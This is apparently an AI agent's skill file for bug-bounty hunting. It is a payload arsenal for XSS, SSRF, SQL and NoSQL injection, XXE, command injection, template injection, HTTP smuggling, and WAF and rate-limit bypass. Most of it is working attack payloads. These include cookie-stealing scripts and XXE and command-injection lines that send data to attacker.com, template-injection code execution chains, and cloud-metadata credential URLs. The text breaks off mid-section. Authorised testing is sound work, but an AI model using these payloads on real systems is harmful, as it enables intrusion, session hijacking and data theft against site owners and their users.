---
name: security-arsenal
description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, bypass techniques, or to check if a finding is submittable. Also use when asked about what NOT to submit.
---

# SECURITY ARSENAL

Payloads, bypass tables, wordlists, and submission rules.

---

## XSS PAYLOADS

### Basic Probes
```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Cookie Theft (proof of impact)
```javascript
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
```

### CSP Bypass Techniques
```javascript
// If unsafe-inline blocked — use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// If script-src nonce present — find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>

// Angular template injection (bypasses many CSPs)
{{constructor.constructor('alert(1)')()}}

// React dangerouslySetInnerHTML reflection
// Vue v-html binding

// mXSS (mutation-based XSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Polyglot (works in HTML/JS/CSS context)
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

### DOM XSS Sources and Sinks
```javascript
// Sources (user-controlled input)
location.hash
location.search
location.href
document.referrer
window.name
document.URL

// Sinks (dangerous)
innerHTML = SOURCE
outerHTML = SOURCE
document.write(SOURCE)
eval(SOURCE)
setTimeout(SOURCE, ...)   // string form
setInterval(SOURCE, ...)
new Function(SOURCE)
element.src = SOURCE      // javascript: URI
element.href = SOURCE
location.href = SOURCE
```

---

## SSRF PAYLOADS

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### Internal Service Fingerprinting
```bash
http://localhost:6379      # Redis (unauthenticated, RESP protocol)
http://localhost:9200      # Elasticsearch (/_cat/indices)
http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
http://localhost:8080      # Admin panel
http://localhost:2375      # Docker API — GET /containers/json
http://localhost:10.96.0.1:443  # Kubernetes API server
```

### SSRF IP Bypass Payloads
```bash
# All of these map to 127.0.0.1:
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1   # hex
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
http://[::ffff:0x7f000001] # mixed hex IPv6

# DNS rebinding: A→external, then resolves to internal after allowlist check

# Redirect chain (Vercel pattern):
# If filter only checks initial URL but follows redirects:
http://allowed-domain.com/redirect?to=http://169.254.169.254/
```

---

## SQL INJECTION PAYLOADS

### Detection
```sql
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based
'; SELECT SLEEP(5)--          -- MySQL time-based
' OR SLEEP(5)--
```

### Union-Based (determine column count)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
```

### Blind SQLi (time-based confirmation)
```sql
# MySQL
' AND SLEEP(5)--
# PostgreSQL
' AND pg_sleep(5)--
# MSSQL
'; WAITFOR DELAY '0:0:5'--
# Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### WAF Bypass
```sql
/*!50000 SELECT*/ * FROM users     -- MySQL inline comment
SE/**/LECT * FROM users             -- comment injection
SeLeCt * FrOm uSeRs                -- case variation
%27 OR %271%27=%271                 -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                       -- Unicode apostrophe
```

---

## XXE PAYLOADS

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Blind OOB via HTTP (DNS confirmation)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>
```

### Blind OOB via DNS + Data Exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
  %param1;
]>
<foo>&exfil;</foo>
```

### XXE via DOCX/SVG/PDF Upload
- SVG: `<image href="file:///etc/passwd" />`
- DOCX: malicious XML in `word/document.xml` with external entity

---

## PATH TRAVERSAL PAYLOADS

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   # double URL encoding
/etc/passwd%00.jpg                     # null byte truncation
....\/....\/etc/passwd                 # mix of separators
```

---

## IDOR / AUTH BYPASS PAYLOADS

### Horizontal Privilege Escalation
```bash
# Change numeric ID
GET /api/user/123/profile → GET /api/user/124/profile

# Change UUID (find victim UUID via other endpoints)
GET /api/profile/a1b2c3d4-... → GET /api/profile/e5f6g7h8-...

# HTTP method swap
PUT /api/user/123 (protected) → DELETE /api/user/123 (not protected)

# Old API version
GET /v2/users/123 (protected) → GET /v1/users/123 (not protected)

# Add parameter
GET /api/orders → GET /api/orders?user_id=456
```

### Vertical Privilege Escalation
```bash
# Parameter pollution
POST /api/user/update
{"role": "admin"}
{"isAdmin": true}
{"admin": 1}

# Hidden fields
<input type="hidden" name="admin" value="true">
# Change in Burp before sending

# GraphQL introspection → find admin mutations
{"query": "{ __schema { types { name fields { name } } } }"}
```

---

## AUTHENTICATION BYPASS PAYLOADS

### JWT Attacks
```bash
# None algorithm
# Decode JWT, change alg to "none", remove signature
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Secret bruteforce
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
```

### OAuth Attacks
```bash
# Missing PKCE test
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# No code_challenge → check if 302 (not error) = PKCE not enforced

# State parameter check
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# Missing/static state parameter = CSRF on OAuth = account linkage attack
```

---

## NOSQL INJECTION PAYLOADS (MongoDB)

### Operator Injection (JSON body)
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
{"username": {"$in": ["admin", "root", "administrator"]}}
```

### GET Parameter Injection
```bash
# URL parameter injection
/login?username[$ne]=null&password[$ne]=null
/login?username[$regex]=.*&password[$regex]=.*
/login?username=admin&password[$gt]=

# MongoDB operator reference:
# $ne = not equal (bypass: value != null = any value matches)
# $gt = greater than (bypass: "" < any string)
# $regex = regex match (bypass: .* = anything)
# $where = JS expression (RCE potential on older MongoDB)
```

### Auth Bypass One-Liners
```bash
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# URL-encoded for GET forms:
# username%5B%24ne%5D=null&password%5B%24ne%5D=null
```

---

## COMMAND INJECTION PAYLOADS

### Basic Detection
```bash
; id
| id
` id `
$(id)
&& id
|| id
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

### Blind OOB (out-of-band confirmation)
```bash
; curl https://attacker.burpcollaborator.net
; nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
`ping -c 1 attacker.burpcollaborator.net`
; wget https://attacker.com/$(id|base64)
```

### Bypass Techniques
```bash
# Bypass space filter
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd

# Bypass keyword filter (cat, id blocked)
# Obfuscate with quotes
;c'a't /etc/passwd
;c"a"t /etc/passwd
;$(printf '\x63\x61\x74') /etc/passwd

# Bypass via env
;$BASH -c 'id'
;${IFS}id

# Windows-specific
& dir
| type C:\Windows\win.ini
& ping -n 1 attacker.com
```

### Context-Specific (filename injection)
```bash
# File upload filenames
test.jpg; id
test$(id).jpg
test`id`.jpg
../test.jpg
../../../../../../etc/passwd
```

---

## SSTI DETECTION PAYLOADS (All Engines)

### Universal Probe (send all, observe which evaluate)
```
{{7*7}}        → 49 = Jinja2 (Python) or Twig (PHP)
${7*7}         → 49 = Freemarker (Java) or Spring EL
<%= 7*7 %>     → 49 = ERB (Ruby) or EJS (Node.js)
#{7*7}         → 49 = Mako (Python) or Pebble (Java)
*{7*7}         → 49 = Spring Thymeleaf
{{7*'7'}}      → 7777777 = Jinja2 (not Twig — Twig gives 49)
${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
```

### RCE Payloads by Engine

**Jinja2 (Python/Flask/Django):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**Freemarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**ERB (Ruby on Rails):**
```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').read %>
```

**Spring Thymeleaf:**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

**EJS (Node.js):**
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

### Where to Test
```
Name/bio/username fields, email subject templates, invoice/PDF generators,
URL path parameters reflected in page, error messages, search query reflections,
HTTP headers that appear in rendered responses, notification templates
```

---

## HTTP SMUGGLING PAYLOADS

### CL.TE — Content-Length front-end, Transfer-Encoding back-end
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — Transfer-Encoding front-end, Content-Length back-end
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


```

### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
```http
# Obfuscate the TE header so one layer ignores it
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### H2.CL — HTTP/2 front-end with Content-Length injection
```
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually (not auto-set by HTTP/2)
# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
# Back-end uses CL → desync
```

### Detection (Burp)
```
1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. All four probe types automatically sent
4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
```

### Impact Chain
```
Basic desync          → Capture victim's next request → Read their auth token
+ Admin user traffic  → Access admin as victim
+ Cache poisoning     → Stored XSS at scale for all users
```

---

## WAF BYPASS REFERENCE

WAF bypass techniques compiled from disclosed bug bounty reports, PortSwigger, PayloadsAllTheThings, and public security research.

### Soft Block Detection (200 OK ≠ Bypass)

WAF vendors often return **HTTP 200 OK with a block page** to confuse attackers:
- Cloudflare JS challenge: `200 OK` + `cf-challenge-form` body
- F5 BIG-IP: `200 OK` + "The requested URL was rejected" + `Support ID: xxxx`
- Imperva: `200 OK` + CAPTCHA page + `_Incapsula_Resource`
- Custom enterprise WAFs: `200 OK` + "Your request has been blocked. Log ID: WAF-..."
- AWS + CloudFront custom error pages: may return `200` or `403` depending on config

**Verdict system in `tools/bypass_403.sh`:**

| Verdict | Meaning | Action |
|---|---|---|
| `bypassed` | Status OK + body diverges from block baseline + no vendor signature | Escalate endpoint |
| `needs_review` | Ambiguous — status looks OK but body unclear | Manual check required |
| `blocked` | Body matches block signature OR length ≈ block baseline | Keep trying |

**401 and 500 are POSITIVE bypass signals:**
- `401 Unauthorized` = you reached the auth middleware (past WAF edge)
- `500 Internal Server Error` = payload triggered backend exception (SQLi/SSTI lead)
- `502/503` = you reached origin (WAF forwarded the request)

**Block baseline:** `bypass_403.sh` samples the target host with a known-bad XSS payload (`/?_waftest=<script>...`) before running probes. It stores the block response length. A bypass probe is only confirmed if:
1. Status ∈ {200, 201, 204, 301, 302, **401, 500, 502, 503**}
2. Body does NOT match vendor block signatures
3. Body length diverges from block baseline by >5%

**WAF Log IDs — also extract them:**

| WAF | Log ID Location | Value for Hunting |
|---|---|---|
| Cloudflare | `CF-Ray: 8a3b...-NRT` | PoP code = origin region hint |
| F5 BIG-IP | Body: `Support ID: 1234567890123456789` | Timestamp encoded in prefix |
| ModSecurity | Body: `[id "942100"]` | **Rule ID = tells you exactly which rule fired** |
| Imperva | Body: `incident ID: 12345-6789` | Sequence gap = traffic volume |
| AWS | Header: `X-Amzn-Trace-Id: Root=1-<hex-ts>-...` | Timestamp in hex |
| Generic | Body: `Log ID: WAF-20240512-xxxx` | Include in bug report for triage |

Log IDs extracted by `tools/bypass_403.sh` and `tools/waf_response_analyzer.py --classify`. Include them in reports — triage can verify directly from internal WAF logs.

### 403 Bypass Quick Reference

| Category | Technique | Payload Example |
|---|---|---|
| IP spoofing | X-Forwarded-For | `X-Forwarded-For: 127.0.0.1` |
| IP spoofing | True-Client-IP | `True-Client-IP: 127.0.0.1` |
| IP spoofing | CF-Connecting-IP | `CF-Connecting-IP: 127.0.0.1` |
| IP spoofing | X-Originating-IP | `X-Originating-IP: 127.0.0.1` |
| IP spoofing | X-ProxyUser-Ip | `X-ProxyUser-Ip: 127.0.0.1` |
| IP spoofing | Client-IP | `Client-IP: 127.0.0.1` |
| IP spoofing | Forwarded RFC 7239 | `Forwarded: for=127.0.0.1` |
| IP spoofing | X-Remote-Addr | `X-Remote-Addr: 127.0.0.1` |
| IP spoofing | X-Remote-IP | `X-Remote-IP: 127.0.0.1` |
| IP spoofing | Via | `Via: 1.1 127.0.0.1` |
| URL rewrite | X-Original-URL | `X-Original-URL: /admin` |
| URL rewrite | X-Rewrite-URL | `X-Rewrite-URL: /admin` |
| URL rewrite | X-Forwarded-Host | `X-Forwarded-Host: localhost` |
| URL rewrite | X-Custom-IP-Authorization | `X-Custom-IP-Authorization: 127.0.0.1` |
| Method override | X-HTTP-Method-Override | `X-HTTP-Method-Override: GET` |
| Method tampering | Verb swap | `POST /admin`, `PUT /admin`, `TRACE /admin` |
| Path encoding | URL-encoded slash | `/admin/%2e/`, `/admin%2F` |
| Path encoding | Double URL-encoded | `/admin/%252e/`, `/admin%252F` |
| Path encoding | Unicode overlong | `/admin/%c0%2e/`, `/admin/%c0%af/` |
| Path tricks | Semicolon | `/admin;/`, `/admin/.;/` |
| Path tricks | Double-dot semicolon | `/admin/..;/`, `/admin..;/` |
| Path tricks | Trailing dot/slash | `/admin/.`, `/admin//`, `/.admin` |
| Path tricks | Whitespace | `/admin%20`, `/admin%09`, `/admin%0a` |
| Path tricks | Suffix injection | `/admin.json`, `/admin.html`, `/admin.css`, `/admin#` |

### WAF Fingerprint Signatures

| WAF | Indicator |
|---|---|
| Cloudflare | `cf-ray:` header, `__cfduid`/`__cf_bm` cookie, "Attention Required" block page |
| AWS WAF | 403 with `x-amzn-requestid:`, `x-amzn-trace-id:`, `x-amz-cf-id:` headers |
| Akamai | `akamai-x-*` headers, "Access Denied" + reference number block page |
| Imperva/Incapsula | `incap_ses_*`, `visid_incap_*` cookies, `X-CDN: Imperva` |
| ModSecurity | `mod_security` or `NAXSI` in 4xx response body |
| F5 BIG-IP ASM | `TS01abcdef` style cookie, `F5-TrafficShield` header |
| Barracuda | `barra_counter_session` cookie |
| Wordfence | "Generated by Wordfence" in block page |
| Sucuri | `X-Sucuri-ID` header |

### Vendor-Specific Bypass Table

| WAF | Bypass Vector | How It Works |
|---|---|---|
| Cloudflare | `Transfer-Encoding: chunked` + `X-Forwarded-Host: localhost` | Chunked TE confuses CF parser |
| Cloudflare | Origin IP direct connection | Find via crt.sh/Shodan, bypass WAF entirely |
| AWS WAF | SQL comment splitting `UN/**/ION SE/**/LECT` | Rule-based scanner misses tokenised payload |
| AWS WAF | Oversized body (>8KB) | AWS skips inspection on cheap tier |
| Imperva | Unicode overlong `%c0%2e%c0%2e/admin` | Decoder mismatch with backend |
| Imperva | Parameter pollution `?id=1&id=2 UNION SELECT` | Inspects first value, backend uses last |
| F5 BIG-IP | Double-slash path `//admin` | Path normalisation difference |
| ModSecurity | Encoding stacking (URL + HTML + unicode) | OWASP CRS misses 3+ layer transforms |
| Akamai | `Pragma: akamai-x-cache-on` debug headers | Forces cache MISS, exposes uncached path |

### Encoding Bypass Reference

| Layer | Original | Encoded | Use Case |
|---|---|---|---|
| URL single | `'` | `%27` | Standard URL |
| URL double | `'` | `%2527` | Decoder runs once on edge |
| URL triple | `'` | `%25252527` | Aggressive proxy chain |
| Unicode JS | `'` | `'` | XSS in JS context |
| HTML decimal | `'` | `&#39;` | Reflected XSS in HTML |
| HTML hex | `'` | `&#x27;` | Reflected XSS in HTML |
| SQL comment | `SELECT` | `SE/**/LECT` | MySQL/Postgres tokeniser |
| MySQL version | `SELECT` | `/*!50000 SELECT*/` | MySQL-only execution |
| SQL whitespace | ` ` | `/**/`, `%0a`, `%0b`, `+` | Replace space in SQL |
| SQL operator | `OR` | `\|\|` | Token-class mismatch |
| SQL operator | `=` | `LIKE` | Avoid `=` token |
| Base64 XSS | `alert(1)` | `<svg onload=eval(atob('YWxlcnQoMSk='))>` | Bypass keyword filter |

Generate all variants with: `tools/waf_encoder.py "<payload>" --class sqli|xss|generic`

### Content-Type Confusion

| Technique | Effect |
|---|---|
| Dual Content-Type headers | Backend picks one, WAF picks the other |
| `application/json` for form data | WAF JSON rules vs form rules differ |
| `text/plain` with JSON body | Many WAFs skip text/plain body inspection |
| `charset=utf-16le` in part | Backend decodes correctly, WAF sees null-byte-padded garbage |
| Boundary case confusion | `boundary=x; BOUNDARY=y` exploits case-insensitive parser drift |

### Multipart Parser Confusion

| Technique | Effect |
|---|---|
| Boundary simplification (`boundary=x`) | Strips WebKit fingerprint, evades boundary-pattern rules |
| Null-byte in boundary (`--x\x00`) | Some parsers truncate at null, others don't |
| `Content-Disposition: form-data; name="f"; x=filename="shell.aspx"` | Payload hidden in sub-param |
| Post-terminator payload (extra part after `--x--`) | Standard parser ignores, lax parser processes |
| Per-part `Content-Type: image/jpeg` | Content scanner skips binary/image parts |
| Duplicate `filename=` param | Parser picks first value, scanner sees second |
| CRLF/LF mix between parts | Strict-CRLF parser breaks, lenient parser continues |

Generate variants with: `tools/multipart_mutator.py --file shell.aspx --field file`

### Origin Server Discovery (Cloudflare Bypass)

```bash
# Certificate transparency (pre-WAF origin)
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u

# Shodan — search by SSL cert subject
shodan search "ssl.cert.subject.cn:$TARGET"

# Historical DNS records
curl -s "https://viewdns.info/iphistory/?domain=$TARGET"

# Direct origin: bypass CF entirely
curl --resolve "$TARGET:443:<origin-ip>" "https://$TARGET/admin"
```

### Bypass Decision Tree

```
Got 403?
├── Run /bypass-403 <url>           (17 headers + 15 paths + 6 methods = 38 probes)
│   ├── Hit → escalate the endpoint (may be Security Misconfiguration finding)
│   └── No hit → continue below
├── Fingerprint WAF (in bypass_403.sh output or wafw00f)
│   ├── Cloudflare → origin IP discovery + TE+XFH trick
│   ├── AWS WAF   → /**/ comment split + oversized body
│   ├── Imperva   → unicode overlong + param pollution
│   └── F5        → double-slash path + strip TS cookie
├── Payload blocked? tools/waf_encoder.py "<payload>" --class sqli|xss
│   └── Try each variant until 200 response
├── Upload endpoint? tools/multipart_mutator.py --file shell --field f
│   └── Try all 10 parser-confusion variants
└── 5 min total, still blocked → kill (5-minute rule)
```

### Junk Character Injection (Disrupt Tokenizers)

WAFs use tokenizers that split on operators/delimiters. Injecting garbage between tokens breaks the token stream while the backend parser ignores the noise:

```
<script>+-+-1-+-+alert(1)+-+-</script>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
/?id=1+un/**/ion+sel/**/ect+1,2--
```

### Unicode Normalization (NFKD) XSS

Backend normalizes full-width/Unicode chars to ASCII after WAF inspection:

```html
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥
<!-- NFKD → <img src=p onerror='prompt(1)'> -->

<marquee onstart=pr۰mpt()>
<!-- ۰ = Persian digit zero = 'o' under some normalizers -->
<!-- decoded: pr0mpt() — WAF misses because it's not "prompt" -->
```

Full-width Unicode characters (U+FF01–U+FF5E) map to ASCII after NFKD normalization. Persian/Arabic digits (۰–۹) can replace Latin digits. Test by sending these and checking if the server normalizes before execution.

### IBM037 / EBCDIC Charset Bypass

IIS decodes `charset=ibm037` (EBCDIC) in POST bodies. WAFs typically only handle UTF-8/ASCII and skip decoding:

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=ibm037

# Body encoded in IBM EBCDIC — WAF cannot read it, IIS decodes it
```

```python
# Python: encode payload in ibm037 for the request body
import urllib.parse
payload = "username=admin&password=test' OR '1'='1"
encoded = payload.encode('ibm037')
# Send encoded bytes in POST body
```

**Why it works:** The WAF only decodes the body as UTF-8. The payload is invisible to pattern matching. IIS (and some other Windows backends) decode IBM037 natively before passing to the application.

### JSON/XML Parser Differential (WAFFLED 2025)

**JSON — 557 unique bypass variants confirmed against Cloudflare/ModSecurity/GCP Cloud Armor:**

```http
# No Content-Type header — some WAFs skip inspection entirely
POST /api/endpoint HTTP/1.1
Host: target.com
# (omit Content-Type)

{"username": "admin' OR '1'='1"}

# Null byte between field name and colon — WAF JSON parser breaks
{"field1"\x00: "payload"}

# Quote replacement (null byte substituted for double quote)
{\x00field1\x00: "value"}
```

**XML — 299 unique bypass variants:**

```xml
<!-- Extra chars at DOCTYPE closure — confuses WAF's parser -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]X>
<foo>&xxe;</foo>

<!-- UTF-16 encode the entire XML payload -->
<!-- iconv -f utf-8 -t utf-16 payload.xml > payload_utf16.xml -->
<!-- Header: Content-Type: text/xml; charset=utf-16 -->
<!-- WAF sees garbage bytes; XML parser decodes charset correctly -->
```

### Hop-by-Hop Header Stripping

List headers in `Connection:` to force intermediate proxies to strip them. If the WAF reads these headers for access decisions BEFORE the proxy strips them, the bypass is achieved:

```http
GET /admin HTTP/1.1
Host: target.com
Connection: X-Forwarded-For, Keep-Alive
X-Forwarded-For: legitimate-IP
```

The proxy removes `X-Forwarded-For` before the request reaches the backend. Backend sees no XFF → defaults to allowing. WAF already blocked based on real IP, but now the backend has no IP to check.

**Standard hop-by-hop headers (strippable by listing in Connection:):**
```
Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization,
TE, Trailer, Transfer-Encoding

Non-standard but often strippable:
Authorization, Cookie, X-Forwarded-For, X-Real-IP
```

**Attack scenario:** WAF allows only trusted IPs via X-Forwarded-For. Forge XFF header + list it in Connection: → proxy strips it → backend trusts the request.

### NGINX / Backend-Specific Path Bypass Characters

Characters that NGINX passes through but the backend treats as a path terminator/separator, causing access control mismatches:

| Backend | NGINX Version | Bypass Chars | Example |
|---|---|---|---|
| Node.js/Express | 1.22.0+ | `\xA0` (NBSP) | `/admin\xA0` |
| Node.js/Express | 1.16.1–1.20.2 | `\xA0`, `\x09`, `\x0C` | `/admin\x09` |
| Flask/Python | 1.22.0+ | `\x85`, `\xA0` | `/admin\x85` |
| Flask/Python | 1.16.1–1.20.2 | `\x85`,`\xA0`,`\x1F`,`\x1E`,`\x1D`,`\x1C`,`\x0C`,`\x0B` | `/admin\x0B` |
| Spring Boot | all | `;` (NGINX 1.20.2+), `\x09` | `/admin;` |
| PHP-FPM | any | `/index.php` path info | `/admin.php/index.php` |

```bash
# Node.js backend — NBSP bypass
curl $'https://target.com/admin\xA0'

# Spring Boot — semicolon separator
curl 'https://target.com/admin;'

# PHP-FPM — path info bypass
curl 'https://target.com/admin.php/index.php'
```

**ModSecurity path confusion:**
```
/foo%3f';alert(1);foo=         # %3f = ?, confuses path parser
/backup%2ebak                  # bypasses .bak extension block rule
```

**Spring Boot suffix pattern match (< v5.3):**
```
/admin.anything               # matches /admin route (useSuffixPatternMatch=true)
/admin.json
/admin.html
```

### Rate Limit Bypass — Endpoint Variation

Counters are often keyed on exact URL. Small variations reset the counter:

```
/api/v1/login
/api/v2/login          # different version → different counter key
/api/v1/Login          # case variation
/api/v1/login/         # trailing slash
/api/v1/login%20       # URL-encoded space (decoded by backend, not by counter)
/api/v1/login?x=1     # added dummy parameter
/api/v1/login#anchor   # fragment (ignored by server, resets counter)
```

**Null byte / character variation for email-based counters:**
```
/reset-password?email=victim@test.com%00
/reset-password?email=victim@test.com%0d
/reset-password?email=victim%2b1@test.com    # Gmail ignores +alias
/reset-password?email=victim+abc@test.com    # Different string, same inbox
```

### Rate Limit Bypass — Protocol-Level Techniques

```bash
# HTTP/2 multiplexing — send 100+ requests in ONE TCP connection
# WAF/rate limiter counts per connection, not per stream
# Use Turbo Intruder in Burp (race conditions tab)
curl --http2-prior-knowledge -d @requests.txt https://target.com/api/otp

# WebSocket upgrade — after upgrade, each message bypasses per-HTTP-request counters
# Connect once, then flood WS messages through the single persistent connection

# GraphQL aliasing — one HTTP request = N mutation attempts
{
  attempt1: login(username: "admin", password: "pass1") { token }
  attempt2: login(username: "admin", password: "pass2") { token }
  attempt3: login(username: "admin", password: "pass3") { token }
  # ... up to 100+ aliases in one request
}

# gRPC bidirectional streaming — messages are not individual HTTP requests
# Rate limiter on HTTP layer doesn't see individual gRPC frames
```

**Timing exploitation:**
```
Window reset attack: burst requests timed to arrive just after rate-limit window resets
  → effectively doubles throughput (burst before reset + burst after)

Slow HTTP: space requests just under detection threshold
  → ffuf -rate 1 -p 5   (1 req/s, 5s pause)
```

### SQLmap Tamper Scripts Reference

```bash
# Single tamper
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment

# Multiple tampers (applied in order left to right)
sqlmap -u "https://target.com/page?id=1" \
  --tamper=between,bluecoat,charencode,randomcase,space2comment \
  --random-agent --delay=2 --level=5 --risk=3
```

**Complete tamper reference:**

| Script | What It Does | Best For |
|---|---|---|
| `apostrophemask` | `'` → UTF-8 full-width `＇` | All |
| `apostrophenullencode` | `'` → `%00%27` | All |
| `base64encode` | Base64-encode entire payload | All |
| `between` | `>` → `NOT BETWEEN 0 AND` | MSSQL/MySQL/Oracle/PG |
| `bluecoat` | space → `%09` (tab) | MySQL, BlueCoat SGOS |
| `chardoubleencode` | double URL-encode all chars | All |
| `charencode` | URL-encode all chars | All |
| `charunicodeencode` | `%uXXXX` encoding | MSSQL/MySQL/ASP.NET |
| `commalesslimit` | `LIMIT 2,3` → `LIMIT 3 OFFSET 2` | MySQL |
| `equaltolike` | `=` → `LIKE` | MSSQL/MySQL |
| `greatest` | `>` → `GREATEST()` | MySQL/Oracle/PG |
| `halfversionedmorekeywords` | space → `/*!0` | MySQL |
| `lowercase` | all keywords lowercase | All |
| `modsecurityversioned` | `AND` → `/*!12345AND*/` | MySQL + ModSecurity |
| `modsecurityzeroversioned` | `AND` → `/*!0AND*/` | MySQL + ModSecurity |
| `multiplespaces` | single space → multiple spaces | All |
| `nonrecursivereplacement` | `union` → `uniunionon` | All |
| `overlongutf8` | overlong UTF-8 encoding | All |
| `percentage` | `select` → `s%e%l%e%c%t` | MSSQL |
| `randomcase` | `INSERT` → `INseRt` | All |
| `randomcomments` | insert `/**/` randomly | MySQL |
| `securesphere` | append `and '0having'='0having'` | All |
| `space2comment` | space → `/**/` | All |
| `space2dash` | space → `--\n` | MSSQL/SQLite |
| `space2hash` | space → `%23\n` | MySQL |
| `space2mssqlblank` | space → random MSSQL blanks | MSSQL |
| `space2mysqlblank` | space → random MySQL blanks | MySQL |
| `space2plus` | space → `+` | All |
| `space2randomblank` | space → random `%09/%0A/%0C/%0D` | All |
| `symboliclogical` | `AND` → `%26%26`, `OR` → `\|\|` | All |
| `unionalltounion` | `UNION ALL SELECT` → `UNION SELECT` | All |
| `unmagicquotes` | `'` → `%bf%27` (GBK multi-byte) | MySQL (magic_quotes) |
| `uppercase` | all keywords uppercase | All |
| `versionedkeywords` | `union` → `/*!union*/` | MySQL |
| `xforwardedfor` | add random `X-Forwarded-For` header | All |

**Pre-built combinations by WAF vendor:**

```bash
# ModSecurity (OWASP CRS)
